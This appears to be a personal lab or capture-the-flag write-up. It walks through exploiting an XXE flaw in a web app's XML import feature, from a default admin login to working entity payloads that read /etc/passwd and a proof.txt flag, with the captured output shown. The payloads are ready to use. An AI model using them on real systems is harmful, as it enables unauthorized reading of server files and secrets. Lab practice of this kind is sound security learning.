after logged in as `bugs:bugs` identified potential `XXE` vulnerability due to the `import:export` functions at `http://mentor/admin/trainer/1`

![[Pasted image 20241122220936.png]]
the first step in `exploiting` `XXE` is to export to identify what fields are being utilized in the `xml`

upon `hitting export` we get an export download
![[Pasted image 20241122221951.png]]
now we have some paths that we can potentially use to exploit
![[Pasted image 20241122222035.png]]

```xml
┌──(root💀gobots)-[23Nov2024 03:16:12]-[/home/kali/Downloads]
└─# cat export          
<?xml version="1.0"?>
<response><id>1</id><name>Robin Marjan</name><proffesion>Web Development</proffesion><bio>Robin is a web developer, mentor, and professor who is prominent in his field. He has been working in the industry for over 20 years and has seen it all. He is passionate about mentoring young developers and helping them learn the ropes. When he is not teaching or coding, he enjoys spending time with her family and friends.</bio><imgPath>/assets/img/trainers/1.jpg</imgPath></response>
```
script to prettify
```bash
┌──(root💀gobots)-[23Nov2024 03:22:20]-[/home/kali/Downloads]
└─# echo '<response><id>1</id><name>Robin Marjan</name><proffesion>Web Development</proffesion><bio>Robin is a web developer, mentor, and professor who is prominent in his field. He has been working in the industry for over 20 years and has seen it all. He is passionate about mentoring young developers and helping them learn the ropes. When he is not teaching or coding, he enjoys spending time with her family and friends.</bio><imgPath>/assets/img/trainers/1.jpg</imgPath></response>' | xmllint --format -
```
original modified
```xml
<?xml version="1.0"?>
<response>
  <id>1</id>
  <name>Robin Marjan</name>
  <proffesion>Web Development</proffesion>
  <bio>Robin is a web developer, mentor, and professor who is prominent in his field. He has been working in the industry for over 20 years and has seen it all. He is passionate about mentoring young developers and helping them learn the ropes. When he is not teaching or coding, he enjoys spending time with her family and friends.</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>

```
now we need to identify which field is vulnerable to `XXE` by utilizing the `&xxe;` payload
#### test1
test 1:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<response>
  <id>&xxe;</id>
  <name>Robin Marjan</name>
  <proffesion>Web Development</proffesion>
  <bio>Robin is a web developer, mentor, and professor who is prominent in his field. He has been working in the industry for over 20 years and has seen it all. He is passionate about mentoring young developers and helping them learn the ropes. When he is not teaching or coding, he enjoys spending time with her family and friends.</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
upon submission in burp shows a server error - nothing happens
![[Pasted image 20241122223139.png]]

-------------
#### test2

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<response>
  <id>1</id>
  <name>&xxe;</name>
  <proffesion>Web Development</proffesion>
  <bio>Robin is a web developer, mentor, and professor who is prominent in his field. He has been working in the industry for over 20 years and has seen it all. He is passionate about mentoring young developers and helping them learn the ropes. When he is not teaching or coding, he enjoys spending time with her family and friends.</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
upon `importing` test2.xml the name was changed to `Vulnerable to XXE` means this is the field 
![[Pasted image 20241122223759.png]]
now going to try to get `/etc/passwd`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>
  <id>1</id>
  <name>&xxe;</name>
  <proffesion>Web Development</proffesion>
  <bio>Robin is a web developer, mentor, and professor who is prominent in his field. He has been working in the industry for over 20 years and has seen it all. He is passionate about mentoring young developers and helping them learn the ropes. When he is not teaching or coding, he enjoys spending time with her family and friends.</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
server error when trying that  - there might be a limit to characters in the `name` field
![[Pasted image 20241122224202.png]]

#### test3 

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<response>
  <id>1</id>
  <name>&xxe;</name>
  <proffesion>&xxe;</proffesion>
  <bio>&xxe;</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
upon importing all fields may be vulnerable to `&xxe;` 
![[Pasted image 20241122224458.png]]
- going to just try the bio for the `/etc/passwd` payload
`test3continued.xml`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>
  <id>1</id>
  <name>ligma</name>
  <proffesion>nutsack</proffesion>
  <bio>&xxe;</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
worked, got `/etc/passwd`
![[Pasted image 20241122224810.png]]
what the burp payload looks like
![[Pasted image 20241122224954.png]]
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

#### test4 - to grab `proof.txt`
proof.txt `6e3df80a257c12117191ae6bf310df54`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///proof.txt">
]>
<response>
  <id>1</id>
  <name>ligma</name>
  <proffesion>nutsack</proffesion>
  <bio>&xxe;</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```

![[Pasted image 20241122231007.png]]
what it looks like in `burpsuite`
![[Pasted image 20241122231123.png]]